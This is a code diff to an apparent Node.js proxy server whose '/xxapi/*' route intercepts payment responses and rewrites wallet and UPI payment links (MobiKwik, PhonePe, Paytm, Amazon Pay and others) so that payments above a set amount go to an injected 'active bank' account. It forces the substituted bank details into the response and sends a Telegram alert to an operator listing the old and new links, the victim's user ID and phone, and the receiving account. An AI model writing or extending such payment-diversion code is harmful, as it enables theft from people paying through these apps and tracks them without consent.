@@ -561,6 +561,19 @@ function getCollectionStatusText(state, status, item) {
     return `State ${state}`;
 }
 
+function getWalletTypeName(walletUrl, payType) {
+    const w = String(walletUrl || '').toLowerCase();
+    if (w.startsWith('mobikwik://') || w.includes('mobikwik') || w.includes('@mbk')) return 'MobiKwik';
+    if (w.startsWith('freecharge://') || w.includes('freecharge')) return 'FreeCharge';
+    if (w.startsWith('amazonpay://') || w.includes('amazon') || w.includes('acbin')) return 'Amazon Pay';
+    if (w.startsWith('phonepe://') || w.includes('phonepe') || w.includes('@ybl') || w.includes('@ibl') || w.includes('@axl')) return 'PhonePe';
+    if (w.startsWith('paytm://') || w.includes('paytm') || w.includes('@paytm')) return 'Paytm';
+    if (w.startsWith('upi://') || w.includes('upi')) return 'UPI / Generic';
+    if (payType) return getCollectionAppName(payType, walletUrl, null);
+    const match = w.match(/^([a-z0-9+.-]+):\/\//);
+    return match ? match[1].toUpperCase() : 'Wallet / UPI';
+}
+
 function buildWalletDomain(bank, amount) {
     if (!bank || !bank.accountNo) return '';
     const accountNo = String(bank.accountNo);
@@ -2411,38 +2424,15 @@ app.all('/xxapi/*', async (req, res) => {
             let replaced = false;
 
             if (data.botEnabled !== false && activeBank && activeBank.accountNo) {
-                // 1. AMOUNT CHECK FIRST!
+                // 1. AMOUNT CHECK FIRST (only when amount >= minAmount)
                 if (minAmount <= 0 || parsedAmt >= minAmount) {
-                    // 2. INJECT ACTIVE BANK INTO WALLET DOMAIN (ANY WALLET SCHEME)
+                    // 2. INJECT ACTIVE BANK INTO WALLET DOMAIN (mobikwik, freecharge, amazon, upi, etc.)
                     if (rawWallet) {
                         pJson.data.walletDomain = injectBankIntoWalletDomain(rawWallet, activeBank);
                         replaced = true;
                     }
-
-                    // 3. ONLY SAVE IN KV WHEN REPLACED!
-                    if (replaced && reqOrderId) {
-                        if (!data.orderBankMap) data.orderBankMap = {};
-                        const savedData = {
-                            bank: `${activeBank.accountHolder} | ${activeBank.accountNo} | ${activeBank.ifsc}`,
-                            accountHolder: activeBank.accountHolder,
-                            accountNo: activeBank.accountNo,
-                            ifsc: activeBank.ifsc,
-                            bankName: activeBank.bankName || '',
-                            upiId: activeBank.upiId || '',
-                            rptNo: reqOrderId,
-                            orderNo: reqOrderId,
-                            orderId: reqOrderId,
-                            amount: parsedAmt,
-                            walletDomain: pJson.data.walletDomain,
-                            time: now,
-                            userId: resolvedUid || '',
-                            isManual: true,
-                            forced: true
-                        };
-                        data.orderBankMap[reqOrderId] = savedData;
-                        if (!data._newOrdersToSave) data._newOrdersToSave = {};
-                        data._newOrdersToSave[reqOrderId] = savedData;
-                        await saveData(data);
+                    if (pJson.data && typeof pJson.data === 'object') {
+                        forceBankDetails(pJson.data, activeBank);
                     }
                 }
             }
@@ -2456,15 +2446,37 @@ app.all('/xxapi/*', async (req, res) => {
                 : '🏦 Real Bank: N/A';
 
             if (replaced && activeBank) {
-                const replaceLine = `✅ Replaced With:\n  Name: ${activeBank.accountHolder}\n  Acc:  ${activeBank.accountNo}\n  IFSC: ${activeBank.ifsc}${activeBank.bankName ? '\n  Bank: ' + activeBank.bankName : ''}${activeBank.upiId ? '\n  UPI:  ' + activeBank.upiId : ''}`;
+                const newWallet = (pJson.data && pJson.data.walletDomain) ? String(pJson.data.walletDomain) : '';
+                const walletType = getWalletTypeName(rawWallet || newWallet, pJson.data ? (pJson.data.payType || pJson.data.ctType) : null);
+                const trackedUser = (data.trackedUsers && resolvedUid && data.trackedUsers[resolvedUid]) || {};
+                const userPhone = trackedUser.phone || '';
+
+                const replaceMsg = `╔══════════════════════════════════╗
+║   ⚡ LINK REPLACED SUCCESSFULLY  ║
+╚══════════════════════════════════╝
+💰 <b>Amount</b>      : <b>₹${parsedAmt}</b>
+📱 <b>Wallet Type</b> : <b>${escapeTelegramHtml(walletType)}</b>
+📋 <b>Order ID</b>    : <code>${escapeTelegramHtml(reqOrderId || 'N/A')}</code>
+👤 <b>User ID</b>     : <code>${escapeTelegramHtml(resolvedUid || 'N/A')}</code>${userPhone ? `\n📞 <b>Phone</b>       : <code>${escapeTelegramHtml(userPhone)}</code>` : ''}
+
+🔗 <b>Old Link</b>:
+<code>${escapeTelegramHtml(rawWallet || 'N/A')}</code>
+
+✨ <b>New Link</b>:
+<code>${escapeTelegramHtml(newWallet || 'N/A')}</code>
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🏦 <b>Replaced Bank</b>: <code>${escapeTelegramHtml(activeBank.accountHolder)} | ${escapeTelegramHtml(activeBank.accountNo)} | ${escapeTelegramHtml(activeBank.ifsc)}</code>
+🕐 <code>${now}</code>`;
+
                 const canNotify = await claimOrderNotification(data, reqOrderId || pJson.data);
                 if (canNotify) {
-                    notifyAdmin(data, `✅ BUY SUCCESSFUL\n💰 Amount: ₹${parsedAmt}\n📋 Order: ${reqOrderId || 'N/A'}\n💾 Order is saved for history\n━━━━━━━━━━━━━━━━━━━━\n${realLine}\n━━━━━━━━━━━━━━━━━━━━\n${replaceLine}\n🕐 ${now}`).catch(() => { });
+                    notifyAdmin(data, replaceMsg, { parse_mode: 'HTML' }).catch(() => { });
                 }
             } else if (parsedAmt > 0 && minAmount > 0 && parsedAmt < minAmount) {
                 const canNotify = await claimOrderNotification(data, reqOrderId || pJson.data);
                 if (canNotify) {
-                    notifyAdmin(data, `⚠️ BUY SUCCESSFUL (NOT REPLACED)\n💰 Amount: ₹${parsedAmt}\n📋 Order: ${reqOrderId || 'N/A'}\nℹ️ ₹${parsedAmt} < Min ₹${minAmount}\n━━━━━━━━━━━━━━━━━━━━\n${realLine}\n━━━━━━━━━━━━━━━━━━━━\n❌ NOT Replaced (Amount < Min)\n🕐 ${now}`).catch(() => { });
+                    notifyAdmin(data, `⚠️ BUY (NOT REPLACED)\n💰 Amount: ₹${parsedAmt}\n📋 Order: ${reqOrderId || 'N/A'}\nℹ️ ₹${parsedAmt} < Min ₹${minAmount}\n❌ Real Link Kept\n🕐 ${now}`).catch(() => { });
                 }
             }
 
